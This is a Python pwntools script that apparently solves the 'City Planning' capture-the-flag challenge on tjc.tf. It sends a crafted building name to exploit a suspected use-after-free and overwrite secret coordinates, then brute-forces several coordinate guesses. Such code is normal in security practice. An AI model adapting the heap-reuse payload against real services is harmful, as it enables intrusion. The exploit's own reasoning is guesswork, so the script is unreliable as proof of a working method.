#!/usr/bin/env python3

from pwn import *
import struct

def main():
    """
    City Planning PWN Challenge Exploit
    
    Vulnerability Analysis:
    1. superSecretHQ is allocated with coordinates = rand() % 150 + 50 (range: 50-199)
    2. approveHQ() checks if coordinates >= 50, which is always true
    3. This means superSecretHQ is ALWAYS freed before we allocate currentBuilding
    4. currentBuilding might reuse the same memory location
    5. We can potentially control the memory that the HQ coordinate comparison reads from
    """
    
    # Connect to remote service
    p = remote('tjc.tf', 31489)
    
    try:
        # Wait for initial prompt
        p.recvuntil(b"Enter the name of your building: ")
        
        # Key insight: Both structures are the same size (44 bytes)
        # If currentBuilding reuses superSecretHQ memory:
        # - HQ coordinates are at offset 4-11 in the original HQPlan
        # - In buildingPlan, this maps to name[4:12]
        
        # We'll embed our target coordinates in the building name
        target_coords = (100, 100)  # Our guess coordinates
        
        payload = b"AAAA"  # Padding for first 4 bytes
        payload += struct.pack("<II", target_coords[0], target_coords[1])  # Our coordinates
        payload += b"B" * (32 - len(payload))  # Fill remaining name space
        
        p.send(payload)
        
        # Building size - must be < 10 to pass approval
        p.recvuntil(b"Enter the size of your building (in acres): ")
        p.sendline(b"5")
        
        # Building coordinates - must be < 200 to pass approval  
        p.recvuntil(b"Enter the east-west coordinate")
        p.sendline(b"10")
        
        p.recvuntil(b"Enter the north-south coordinate")
        p.sendline(b"10")
        
        # Check if we get to the guessing phase
        response = p.recvline()
        
        if b"approved" in response:
            print("[+] Building approved! Proceeding to coordinate guessing...")
            
            # Skip to coordinate input
            p.recvuntil(b"Enter the east-west coordinate: ")
            p.sendline(str(target_coords[0]).encode())
            
            p.recvuntil(b"Enter the north-south coordinate: ")
            p.sendline(str(target_coords[1]).encode())
            
            # Get the result
            result = p.recvall(timeout=3)
            print(f"[*] Result: {result.decode()}")
            
            if b"Correct" in result:
                print("[+] SUCCESS! Exploit worked!")
                return True
            else:
                print("[-] Coordinate guess was wrong")
                
        else:
            print(f"[-] Building not approved: {response.decode()}")
            
    except Exception as e:
        print(f"[-] Error: {e}")
        
    finally:
        p.close()
    
    return False

def try_multiple_approaches():
    """Try different coordinate values in case the first doesn't work"""
    
    # Try different coordinate pairs that might work
    coordinate_pairs = [
        (100, 100),
        (150, 150), 
        (75, 75),
        (125, 125),
        (50, 50),
        (199, 199),
        (0, 0),  # In case memory gets zeroed
    ]
    
    for coords in coordinate_pairs:
        print(f"[*] Trying coordinates: {coords}")
        
        try:
            p = remote('tjc.tf', 31489)
            
            p.recvuntil(b"Enter the name of your building: ")
            
            # Craft payload with target coordinates
            payload = b"AAAA"
            payload += struct.pack("<II", coords[0], coords[1])
            payload += b"B" * (32 - len(payload))
            
            p.send(payload)
            
            p.recvuntil(b"Enter the size of your building (in acres): ")
            p.sendline(b"1")
            
            p.recvuntil(b"Enter the east-west coordinate")
            p.sendline(b"1")
            
            p.recvuntil(b"Enter the north-south coordinate")
            p.sendline(b"1")
            
            response = p.recv(timeout=2)
            
            if b"approved" in response:
                p.recvuntil(b"Enter the east-west coordinate: ")
                p.sendline(str(coords[0]).encode())
                
                p.recvuntil(b"Enter the north-south coordinate: ")
                p.sendline(str(coords[1]).encode())
                
                result = p.recvall(timeout=2)
                
                if b"Correct" in result or b"flag" in result or b"tjctf" in result:
                    print(f"[+] SUCCESS with coordinates {coords}!")
                    print(f"[+] Flag: {result.decode()}")
                    return True
                    
            p.close()
            
        except Exception as e:
            try:
                p.close()
            except:
                pass
            continue
    
    return False

if __name__ == "__main__":
    print("=== City Planning Exploit ===")
    
    if not main():
        print("\n[*] First attempt failed, trying multiple coordinate pairs...")
        if not try_multiple_approaches():
            print("\n[-] All attempts failed!")
        else:
            print("\n[+] Exploit successful!")
